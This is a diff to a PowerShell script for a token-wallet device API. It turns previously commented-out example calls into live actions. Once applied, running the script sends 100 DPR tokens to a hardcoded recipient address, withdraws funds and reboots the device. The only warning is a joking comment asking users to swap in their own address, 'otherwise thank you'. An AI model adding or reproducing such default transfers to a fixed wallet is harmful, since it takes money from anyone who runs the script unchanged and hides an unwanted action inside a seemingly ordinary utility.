@@ -68,10 +68,10 @@ Function Send-DPR
 }
 
 #Sending
-$Recipient = "5C5kUhQsECAcr7VovYBn6kEUe87JmdXDX4uwu2XyNomPtAyU"
-$DPRAmount = 10
+$Recipient = "5C5kUhQsECAcr7VovYBn6kEUe87JmdXDX4uwu2XyNomPtAyU" #ensure to change this with your own address, otherwise thank you :)
+$DPRAmount = 100
 $WalletPassword = Get-WalletPassword
-#Send-DPR -IPAddress $IPAddress -Recepient $Recipient -DPRAmount $DPRAmount -Token $Token -EncryptedWalletPassword $WalletPassword
+Send-DPR -IPAddress $IPAddress -Recepient $Recipient -DPRAmount $DPRAmount -Token $Token -EncryptedWalletPassword $WalletPassword
 
 Function Get-Values
 {
@@ -240,7 +240,7 @@ Function Get-Values
     $Collection
 }
 
-#Get-Values -IPAddress $IPAddress -Token $Token
+Get-Values -IPAddress $IPAddress -Token $Token
 
 Function Withdraw-NPOW
 {
@@ -249,7 +249,7 @@ Function Withdraw-NPOW
     (Invoke-WebRequest -UseBasicParsing -Uri "$($URI)/dep/withdraw" -Headers @{"Authorization" = $Token} -Method POST | Select-Object -ExpandProperty Content | ConvertFrom-Json | Select Success).Success
 }
 
-#Withdraw-NPOW -IPAddress $IPAddress -Token $Token
+Withdraw-NPOW -IPAddress $IPAddress -Token $Token
 
 Function Reboot-Device
 {
@@ -259,6 +259,6 @@ Function Reboot-Device
     Invoke-WebRequest -UseBasicParsing -Uri "$($URI)/admin/reboot" -Headers @{"Authorization" = $Token} -Method POST | Out-Null
 }
 
-#Reboot-Device -IPAddress $IPAddress -Token $Token
+Reboot-Device -IPAddress $IPAddress -Token $Token
 
 
